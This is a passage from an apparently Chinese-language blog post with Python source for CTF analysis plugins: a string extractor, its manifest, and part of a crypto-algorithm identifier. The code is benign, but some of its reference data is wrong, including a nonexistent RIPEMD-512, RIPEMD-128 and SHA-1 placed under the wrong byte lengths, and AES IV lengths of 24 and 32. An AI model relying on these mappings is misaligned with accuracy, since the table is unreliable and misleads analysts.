BytesIO</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Plugin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = <span class="string">&quot;String Extractor Tool&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.description = <span class="string">&quot;Extract printable strings from binary files&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.version = <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.author = <span class="string">&quot;CTF Tool Team&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.min_length = <span class="number">4</span>  <span class="comment"># 默认最小字符串长度</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化插件&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">SetMinLength</span>(<span class="params">self, length</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;设置最小字符串长度&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.min_length = <span class="built_in">max</span>(<span class="number">2</span>, <span class="built_in">int</span>(length))  <span class="comment"># 确保至少为2</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ExtractStrings</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;从二进制数据中提取字符串&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">            <span class="comment"># 尝试处理十六进制字符串</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefABCDEF &quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> data):</span><br><span class="line">                    data = <span class="built_in">bytes</span>.fromhex(data.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    data = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                data = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                </span><br><span class="line">        <span class="comment"># 提取ASCII字符串</span></span><br><span class="line">        ascii_pattern = re.<span class="built_in">compile</span>(<span class="string">b&#x27;[ -~]&#123;&#x27;</span> + <span class="built_in">str</span>(<span class="variable language_">self</span>.min_length).encode() + <span class="string">b&#x27;,&#125;&#x27;</span>)</span><br><span class="line">        ascii_strings = [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;ASCII&quot;</span>,</span><br><span class="line">                <span class="string">&quot;offset&quot;</span>: <span class="built_in">hex</span>(m.start()),</span><br><span class="line">                <span class="string">&quot;length&quot;</span>: <span class="built_in">len</span>(m.group()),</span><br><span class="line">                <span class="string">&quot;string&quot;</span>: m.group().decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> ascii_pattern.finditer(data)</span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 提取UTF-16字符串 (小端序)</span></span><br><span class="line">        utf16_pattern = re.<span class="built_in">compile</span>(<span class="string">b&#x27;([ -~]\x00)&#123;&#x27;</span> + <span class="built_in">str</span>(<span class="variable language_">self</span>.min_length).encode() + <span class="string">b&#x27;,&#125;&#x27;</span>)</span><br><span class="line">        utf16_strings = []</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> utf16_pattern.finditer(data):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 移除空字节并解码</span></span><br><span class="line">                utf16_str = m.group().replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                utf16_strings.append(&#123;</span><br><span class="line">                    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;UTF-16&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;offset&quot;</span>: <span class="built_in">hex</span>(m.start()),</span><br><span class="line">                    <span class="string">&quot;length&quot;</span>: <span class="built_in">len</span>(utf16_str),</span><br><span class="line">                    <span class="string">&quot;string&quot;</span>: utf16_str</span><br><span class="line">                &#125;)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line">        <span class="comment"># 合并并按偏移排序</span></span><br><span class="line">        all_strings = ascii_strings + utf16_strings</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sorted</span>(all_strings, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&quot;offset&quot;</span>], <span class="number">16</span>))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Run</span>(<span class="params">self, context_json</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行插件逻辑&quot;&quot;&quot;</span></span><br><span class="line">        context = json.loads(context_json)</span><br><span class="line">        input_data = context.get(<span class="string">&quot;InputText&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 处理最小长度参数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;MinLength&quot;</span> <span class="keyword">in</span> context:</span><br><span class="line">            <span class="variable language_">self</span>.SetMinLength(context[<span class="string">&quot;MinLength&quot;</span>])</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 提取字符串</span></span><br><span class="line">        strings = <span class="variable language_">self</span>.ExtractStrings(input_data)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;min_length&quot;</span>: <span class="variable language_">self</span>.min_length,</span><br><span class="line">            <span class="string">&quot;string_count&quot;</span>: <span class="built_in">len</span>(strings),</span><br><span class="line">            <span class="string">&quot;strings&quot;</span>: strings</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;生成插件UI界面&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;padding: 15px;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;String Extractor Tool&lt;/h3&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Extract printable strings from binary data.&lt;/p&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;div style=&quot;margin-bottom: 15px;&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;label for=&quot;min-length&quot; style=&quot;display: inline-block; width: 120px;&quot;&gt;Minimum Length:&lt;/label&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;number&quot; id=&quot;min-length&quot; value=&quot;4&quot; min=&quot;2&quot; max=&quot;100&quot; style=&quot;width: 60px;&quot;/&gt;</span></span><br><span class="line"><span class="string">                &lt;button onclick=&quot;updateMinLength()&quot; style=&quot;margin-left: 10px;&quot;&gt;Set&lt;/button&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;div style=&quot;background-color: #f0f0f0; padding: 10px; border-radius: 5px; margin-top: 10px; font-family: monospace; font-size: 12px;&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;strong&gt;Usage:&lt;/strong&gt;</span></span><br><span class="line"><span class="string">                &lt;ul&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;Enter binary data (raw or hex-encoded) in the main input box&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;Set minimum string length (default: 4)&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;Click &quot;Execute&quot; to extract strings&lt;/li&gt;</span></span><br><span class="line"><span class="string">                &lt;/ul&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&lt;strong&gt;Extracts:&lt;/strong&gt; ASCII and UTF-16 (little-endian) strings&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;script&gt;</span></span><br><span class="line"><span class="string">                function updateMinLength() &#123;</span></span><br><span class="line"><span class="string">                    const minLength = document.getElementById(&#x27;min-length&#x27;).value;</span></span><br><span class="line"><span class="string">                    // 在实际实现中，这里会将值传递给插件</span></span><br><span class="line"><span class="string">                    alert(&#x27;Minimum length set to: &#x27; + minLength + &#x27; (Note: This is a demo, actual implementation requires host integration)&#x27;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Dispose</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;清理资源&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="字符串提取工具插件清单-Plugins-StringExtractorTool-manifest-json"><a href="#字符串提取工具插件清单-Plugins-StringExtractorTool-manifest-json" class="headerlink" title="字符串提取工具插件清单 (Plugins/StringExtractorTool/manifest.json)"></a>字符串提取工具插件清单 (Plugins/StringExtractorTool/manifest.json)</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;StringExtractorTool&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Extract printable strings from binary files&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CTF Tool Team&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;EntryPoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main.py&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="5-逆向工程插件：加密算法识别工具-Plugins-CryptoIdentifierTool-main-py"><a href="#5-逆向工程插件：加密算法识别工具-Plugins-CryptoIdentifierTool-main-py" class="headerlink" title="5. 逆向工程插件：加密算法识别工具 (Plugins/CryptoIdentifierTool/main.py)"></a>5. 逆向工程插件：加密算法识别工具 (Plugins/CryptoIdentifierTool/main.py)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, DES, Blowfish  <span class="comment"># 需要pycryptodome库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Plugin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = <span class="string">&quot;Crypto Identifier Tool&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.description = <span class="string">&quot;Identify potential encryption algorithms in binary data&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.version = <span class="string">&quot;1.0.0&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.author = <span class="string">&quot;CTF Tool Team&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 加密算法特征模式</span></span><br><span class="line">        <span class="variable language_">self</span>.signatures = &#123;</span><br><span class="line">            <span class="string">&quot;AES&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;iv_lengths&quot;</span>: [<span class="number">16</span>, <span class="number">24</span>, <span class="number">32</span>],</span><br><span class="line">                <span class="string">&quot;key_sizes&quot;</span>: [<span class="number">16</span>, <span class="number">24</span>, <span class="number">32</span>],</span><br><span class="line">                <span class="string">&quot;patterns&quot;</span>: [</span><br><span class="line">                    re.<span class="built_in">compile</span>(<span class="string">r&quot;AES|Advanced Encryption Standard&quot;</span>, re.IGNORECASE),</span><br><span class="line">                    re.<span class="built_in">compile</span>(<span class="string">r&quot; Rijndael &quot;</span>, re.IGNORECASE)</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;DES&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;iv_lengths&quot;</span>: [<span class="number">8</span>],</span><br><span class="line">                <span class="string">&quot;key_sizes&quot;</span>: [<span class="number">8</span>],</span><br><span class="line">                <span class="string">&quot;patterns&quot;</span>: [</span><br><span class="line">                    re.<span class="built_in">compile</span>(<span class="string">r&quot;DES|Data Encryption Standard&quot;</span>, re.IGNORECASE)</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;3DES&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;iv_lengths&quot;</span>: [<span class="number">8</span>],</span><br><span class="line">                <span class="string">&quot;key_sizes&quot;</span>: [<span class="number">24</span>],</span><br><span class="line">                <span class="string">&quot;patterns&quot;</span>: [</span><br><span class="line">                    re.<span class="built_in">compile</span>(<span class="string">r&quot;3DES|Triple DES|Triple Data Encryption Standard&quot;</span>, re.IGNORECASE)</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;Blowfish&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;iv_lengths&quot;</span>: [<span class="number">8</span>],</span><br><span class="line">                <span class="string">&quot;key_sizes&quot;</span>: <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">4</span>, <span class="number">57</span>)),</span><br><span class="line">                <span class="string">&quot;patterns&quot;</span>: [</span><br><span class="line">                    re.<span class="built_in">compile</span>(<span class="string">r&quot;Blowfish&quot;</span>, re.IGNORECASE)</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;RSA&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;key_sizes&quot;</span>: [<span class="number">1024</span>, <span class="number">2048</span>, <span class="number">4096</span>],</span><br><span class="line">                <span class="string">&quot;patterns&quot;</span>: [</span><br><span class="line">                    re.<span class="built_in">compile</span>(<span class="string">r&quot;RSA|Ron Rivest|Adi Shamir|Leonard Adleman&quot;</span>, re.IGNORECASE),</span><br><span class="line">                    re.<span class="built_in">compile</span>(<span class="string">r&quot;Public Key|Private Key&quot;</span>, re.IGNORECASE)</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;MD5&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;hash_length&quot;</span>: <span class="number">16</span>,</span><br><span class="line">                <span class="string">&quot;patterns&quot;</span>: [</span><br><span class="line">                    re.<span class="built_in">compile</span>(<span class="string">r&quot;MD5|Message Digest 5&quot;</span>, re.IGNORECASE)</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;SHA1&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;hash_length&quot;</span>: <span class="number">20</span>,</span><br><span class="line">                <span class="string">&quot;patterns&quot;</span>: [</span><br><span class="line">                    re.<span class="built_in">compile</span>(<span class="string">r&quot;SHA1|Secure Hash Algorithm 1&quot;</span>, re.IGNORECASE)</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;SHA256&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;hash_length&quot;</span>: <span class="number">32</span>,</span><br><span class="line">                <span class="string">&quot;patterns&quot;</span>: [</span><br><span class="line">                    re.<span class="built_in">compile</span>(<span class="string">r&quot;SHA256|Secure Hash Algorithm 256&quot;</span>, re.IGNORECASE)</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化插件&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">AnalyzeData</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;分析数据以识别潜在的加密算法&quot;&quot;&quot;</span></span><br><span class="line">        results = &#123;</span><br><span class="line">            <span class="string">&quot;detected_algorithms&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;hash_candidates&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;key_candidates&quot;</span>: [],</span><br><span class="line">            <span class="string">&quot;iv_candidates&quot;</span>: []</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 转换输入数据为字节</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 尝试从十六进制解析</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefABCDEF &quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> data):</span><br><span class="line">                    data = <span class="built_in">bytes</span>.fromhex(data.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    data = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                data = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                </span><br><span class="line">        <span class="comment"># 搜索算法特征字符串</span></span><br><span class="line">        text_data = data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> alg, info <span class="keyword">in</span> <span class="variable language_">self</span>.signatures.items():</span><br><span class="line">            <span class="keyword">for</span> pattern <span class="keyword">in</span> info.get(<span class="string">&quot;patterns&quot;</span>, []):</span><br><span class="line">                <span class="keyword">if</span> pattern.search(text_data):</span><br><span class="line">                    results[<span class="string">&quot;detected_algorithms&quot;</span>].append(&#123;</span><br><span class="line">                        <span class="string">&quot;algorithm&quot;</span>: alg,</span><br><span class="line">                        <span class="string">&quot;detection_method&quot;</span>: <span class="string">&quot;signature&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;confidence&quot;</span>: <span class="string">&quot;high&quot;</span></span><br><span class="line">                    &#125;)</span><br><span class="line">                    <span class="keyword">break</span>  <span class="comment"># 找到一个特征就够了</span></span><br><span class="line">                    </span><br><span class="line">        <span class="comment"># 分析可能的哈希值</span></span><br><span class="line">        hash_candidates = <span class="variable language_">self</span>._find_hash_candidates(data)</span><br><span class="line">        results[<span class="string">&quot;hash_candidates&quot;</span>].extend(hash_candidates)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 分析可能的密钥和IV</span></span><br><span class="line">        key_iv_candidates = <span class="variable language_">self</span>._find_key_iv_candidates(data)</span><br><span class="line">        results[<span class="string">&quot;key_candidates&quot;</span>].extend(key_iv_candidates[<span class="string">&quot;keys&quot;</span>])</span><br><span class="line">        results[<span class="string">&quot;iv_candidates&quot;</span>].extend(key_iv_candidates[<span class="string">&quot;ivs&quot;</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> results</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_find_hash_candidates</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;查找可能的哈希值&quot;&quot;&quot;</span></span><br><span class="line">        candidates = []</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查常见哈希长度</span></span><br><span class="line">        hash_lengths = &#123;</span><br><span class="line">            <span class="number">16</span>: [<span class="string">&quot;MD5&quot;</span>],</span><br><span class="line">            <span class="number">20</span>: [<span class="string">&quot;SHA1&quot;</span>, <span class="string">&quot;RIPEMD-128&quot;</span>],</span><br><span class="line">            <span class="number">28</span>: [<span class="string">&quot;SHA-224&quot;</span>],</span><br><span class="line">            <span class="number">32</span>: [<span class="string">&quot;SHA-256&quot;</span>, <span class="string">&quot;RIPEMD-256&quot;</span>],</span><br><span class="line">            <span class="number">40</span>: [<span class="string">&quot;SHA-1&quot;</span>],</span><br><span class="line">            <span class="number">64</span>: [<span class="string">&quot;SHA-512&quot;</span>, <span class="string">&quot;RIPEMD-512&quot;</span>]</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 在数据中查找所有可能的哈希长度块</span></span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">            <span class="keyword">for</span> length, algs <span class="keyword">in</span> hash_lengths.items():</span><br><span class="line">                <span class="keyword">if</span> offset + length &gt; <span class="built_in">len</span>(data):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                    </span><br><span class="line">                candidate = data[offset:offset+length]</span><br><span class="line">                <span class="comment"># 哈希值通常是随机分布的字节</span></span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>._is_random_looking(candidate):</span><br><span class="line">                    candidates.append(&#123;</span><br><span class="line">                        <span class="string">&quot;offset&quot;</span>: <span class="built_in">hex</span>(offset),</span><br><span class="line">                        <span class="string">&quot;length&quot;</span>: length,</span><br><span class="line">                        <span class="string">&quot;algorithms&quot;</span>: algs,</span><br><span class="line">                        <span class="string">&quot;hex_value&quot;</span>: candidate.<span class="built_in">hex</span>()</span><br><span class="line">                    &#125;)</span><br><span class="line">                    </span><br><span class="line">        <span class="keyword">return</span> candidates</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_find_key_iv_candidates</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;查找可能的密钥和IV&quot;&quot;&quot;</span></span><br><span class="line">        results = &#123;<span class="string">&quot;keys&quot;</span>: [], <span class="string">&quot;ivs&quot;</span>: []&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查已知的密钥和IV长度</span></span><br><span class="line">        <span class="keyword">for</span> alg, info <span class="keyword">in</span> <span class="variable language_">self</span>.signatures.items():</span><br><span class="line">            <span class="comment"># 检查IV长度</span></span><br><span class="line">            <span class="keyword">for</span> iv_len <span class="keyword">in</span> info.get(<span class="string">&quot;iv_lengths&quot;</span>, []):</span><br><span class="line">                <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data) - iv_len + <span class="number">1</span>):</span><br><span class="line">                    candidate = data[offset:offset+iv_len]</span><br><span class="line">                    <span class="keyword">if</span> <span class="variable language_">self</span>._is_random_looking(candidate):</span><br><span class="line">                        results[<span class="string">&quot;ivs&quot;</span>].append(&#123;</span><br><span class="line">                            <span class="string">&quot;offset&quot;</span>: <span class="built_in">hex</span>(offset),</span><br><span class="line">                            <span class="string">&quot;length&quot;</span>: iv_len,</span><br><span class="line">                            <span class="string">&quot;algorithm&quot;</span>: alg,</span><br><span class="line">                            <span class="string">&quot;hex_value&quot;</span>: candidate.<span class="built_in">hex</span>()</span><br><span class="line">                        &#125;)</span><br><span class="line">                        </span><br><span class="line">            <span class="comment"># 检查密钥长度</span></span><br><span class="line">            <span 